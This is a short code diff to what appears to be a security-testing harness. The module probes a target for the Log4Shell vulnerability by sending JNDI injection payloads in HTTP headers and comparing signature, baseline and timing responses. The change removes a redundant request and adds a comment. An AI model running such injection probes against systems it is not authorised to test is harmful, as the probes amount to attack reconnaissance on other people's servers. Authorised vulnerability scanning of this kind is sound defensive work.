@@ -89,19 +89,20 @@ def run(target, ctx):
     port = ctx.get_port("log4shell", 8080)
     out = ["# Log4Shell probe vs %s:%d" % (target, port), ""]
 
-    # find the endpoint that serves (payload reaches the app); signature probe each
+    # find the endpoint that serves (payload reaches the app); signature probe each.
+    # Every probe's HTTP_CODE line is recorded in `out`, which is what the
+    # classifier reads — so the served-vs-blocked verdict stands whether or not a
+    # path served, with no extra request needed.
     url = None
-    sig_raw = ""
     for path in _PATHS:
         u = "http://%s:%d%s" % (target, port, path)
         r = _probe(ctx, target, u, _JNDI_LOCAL, 10, _W_SIGNAL)
         out += ["## signature probe (JNDI in UA + X-Api-Version) -> %s" % path, r, ""]
         if re.search(r"HTTP_CODE:[23]\d\d", r):
-            url, sig_raw = u, r
+            url = u
             break
-    if url is None:                       # none served 2xx/3xx -> use first path's result
+    if url is None:                       # none served 2xx/3xx -> use first path for the timing legs
         url = "http://%s:%d%s" % (target, port, _PATHS[0])
-        sig_raw = sig_raw or _probe(ctx, target, url, _JNDI_LOCAL, 10, _W_SIGNAL)
 
     baseline_raw = _probe(ctx, target, url, "harness-baseline-probe", 8, _W_BASELINE)
     timing_raw = _probe(ctx, target, url, _JNDI_BLACKHOLE, 15, _W_SIGNAL)
